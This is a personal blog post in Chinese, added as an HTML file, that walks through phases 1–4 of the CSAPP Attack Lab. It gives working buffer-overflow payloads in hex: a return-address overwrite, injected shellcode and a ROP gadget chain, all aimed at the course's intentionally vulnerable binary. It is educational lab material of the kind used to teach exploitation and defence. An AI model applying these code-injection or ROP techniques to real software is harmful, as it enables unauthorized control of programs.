@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <title>CSAPP - Attack Lab 记录 - HLin&#39;s Blog</title>
+  <meta name="generator" content="Hugo 0.68.3" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="Humphrey Lin">
+  
+  <meta name="description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任">
+  
+  <meta name="keywords" content="">
+  <meta property="og:site_name" content="HLin&#39;s Blog">
+  <meta property="og:title" content="CSAPP - Attack Lab 记录">
+  <meta property="og:url" content="https://humpylin.github.io/posts/csapp/attacklab/">
+  
+  <meta property="og:image" content="https://humpylin.github.ioimage/theme/og.png">
+  
+  
+  <meta property="og:description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任">
+  
+  <meta property="og:type" content="blog">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:creator" content="@">
+  <meta name="twitter:title" content="CSAPP - Attack Lab 记录">
+  <meta name="twitter:url" content="https://humpylin.github.io/posts/csapp/attacklab/">
+  
+  <meta name="twitter:description" content="Phase 1 先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任">
+  
+  
+  <meta name="twitter:image:src" content="https://humpylin.github.ioimage/theme/og.png">
+  
+  <link rel="shortcut icon" href="https://humpylin.github.ioimage/theme/favicon.ico">
+  <link href="https://fonts.googleapis.com/earlyaccess/sawarabigothic.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="alternate" href="https://humpylin.github.ioindex.xml" type="application/rss+xml" title="HLin&#39;s Blog">
+</head>
+
+
+<body>
+  <div id="wrap" class="wrap">
+    
+  <header class="header">
+  <div class="site-title"><a href="/">HLin&#39;s Blog</a></div>
+  <p class="site-desc"></p>
+  
+</header>
+
+
+    
+  <main class="main main--single">
+    
+    <article class="post"　itemscope itemtype="http://schema.org/BlogPosting">
+      <h1 class="post__title">CSAPP - Attack Lab 记录</h1>
+      <p class="post__date">
+        <time itemprop="datePublished" datetime="2019-08-08T20:17:53&#43;08:00">2019.08.08</time>
+      </p>
+      <div class="post-content">
+        <h2 id="phase-1">Phase 1</h2>
+<p>先根据提示，读一下 getbuf 的源代码，可以发现 BUFFER_SIZE 的大小为 0x28 ，也就是 40 个字节。继续读汇编代码可以发现，touch1 的地址为 0x04017c0 。于是只要先输入 40 个任意字符（不是换行或者 EOF），再输入地址就可以了。这里要注意一个大小端的问题，可以先用 GDB 看看到底是怎样的，我的机器要输入的便是 <code>c0 17 40</code> 以及后面接上若干零凑成十六位。</p>
+<h2 id="phase-2">Phase 2</h2>
+<p>这一次不断需要修改返回地址，还需要修改 <code>%rdi</code> 的值。除非可以执行自己写的 <code>mov</code> 指令，否则很难修改 <code>%rdi</code> 的值，但是要如何在程序里运行自己写的代码呢？通过输入的字符串。只需要保证自己输入了一条指令，然后让 getbuf 跳转到自己写得命令即可。</p>
+<p>根据自己的 cookie 写好指令：</p>
+<pre><code class="language-assembly" data-lang="assembly">mov $0x59b997fa, %rdi # write my cookie into %rdi
+pushq $0x04017ec # touch2
+retq
+</code></pre><p>转换成汇编代码：</p>
+<pre><code class="language-assembly" data-lang="assembly">0000000000000000 &lt;.text&gt;:
+    0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+    7:   68 ec 17 40 00          pushq  $0x4017ec
+    c:   c3                      retq
+</code></pre><p>通过 GDB 可以看到，运行完 Gets 时，<code>%rsp</code> 的值为 0x5561dc78 。故第二个字符串应该如下。</p>
+<pre><code>48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+</code></pre><h2 id="phase-3">Phase 3</h2>
+<p>这一次要求参数是一个字符串，先查 ASCII 表，把 Cookie 的字符串变成十六进制的形式，我的为 <code>35 39 62 39 39 37 66 61 00</code> 。然后和 phase 2 一样，写好传参的代码。这里一开始改变了栈指针，是因为我选择把字符串放在最后，然后通过移动栈指针来保护字符串，字符串本身的九个字符以及之前 ret 的地址，共需要移动 17 个字节。</p>
+<pre><code class="language-assembly" data-lang="assembly">sub $0x11, %rsp
+mov %rsp, %rdi
+pushq $0x4018fa
+retq
+</code></pre><p>转换成汇编代码。</p>
+<pre><code class="language-assembly" data-lang="assembly">Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 83 ec 11             sub    $0x11,%rsp
+   4:   48 89 e7                mov    %rsp,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq
+</code></pre><p>然后写成十六进制形式，需要把字符串放置于 return 地址的前面。</p>
+<pre><code>48 83 ec 11 48 89 e7 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 35
+39 62 39 39 37 66 61 00
+78 dc 61 55 00 00 00 00
+</code></pre><h2 id="phase-4">Phase 4</h2>
+<p>这一次是要利用 gadgets 来实现攻击，我们要执行的汇编代码应该先通过 pop 将 cookie 传给 <code>%rdi</code> ，然后再返回到 touch 2 函数。不过查看 start farm 到 mid farm 中间的函数，并没有 <code>5f</code> 可以使用，那么不妨先将 cookie 传给某个中间寄存器，再传给 <code>%rdi</code> ，阅读函数，发现 <code>addval_219</code> 以及 <code>setval_426</code> 可以做到。</p>
+<p>那么本题字符串如下。</p>
+<pre><code>00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00 
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+</code></pre><h2 id="phase-5">Phase 5</h2>
+<p>（既然文档都不断规劝我不要做了，那我就不做了吧……）</p>
+<h2 id="收获">收获</h2>
+<p>对两种攻击方式有了更深的了解，不过似乎这些方式在加入了金丝雀数的后都无法奏效了。另外也明白了缓冲区溢出的危险。</p>
+
+      </div>
+    </article>
+    
+    <hr class="post-hr">
+    
+    <nav class="post-nav">
+      <ol class="pure-g">
+        
+        <li class="pure-u-1 pure-u-md-1-2 post-nav-prev">
+        </li>
+        
+        
+        <li class="pure-u-1 pure-u-md-1-2 post-nav-next">
+          <a href="https://humpylin.github.io/posts/csapp/bomblab/">
+            <span class="post-nav-label">古い記事</span>
+            <span class="post-nav-title">
+              CSAPP - Bomb Lab 记录
+            </span>
+          </a>
+        </li>
+        
+      </ol>
+      <div class="post-nav-back">
+        <a class="pure-button" href="/">記事一覧へ戻る</a>
+      </div>
+    </nav>
+  
+    <div id="comments">
+      
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "humpylin-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    </div>
+  </main>
+
+    
+  <footer class="footer">
+  <section class="author">
+    <h2>Author</h2>
+    <div class="pure-g">
+      <div class="author__image pure-u-1-5 pure-u-md-1-8">
+        <img src="https://humpylin.github.ioimage/theme/author.png" alt="">
+      </div>
+      <div class="author__info pure-u-4-5 pure-u-md-7-8">
+        
+        <h3>Humphrey Lin</h3>
+        
+        
+        <p>I am a Computer Sicence student in China.</p>
+        
+        <ul class="author__links">
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+  </section>
+  <small>©HLin&#39;s Blog</small>
+</footer>
+
+
+  </div>
+
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+<script src="/js/mathjax-config.js"></script>
+<script src="/js/script.js"></script>
+
+</body>
+
+</html>
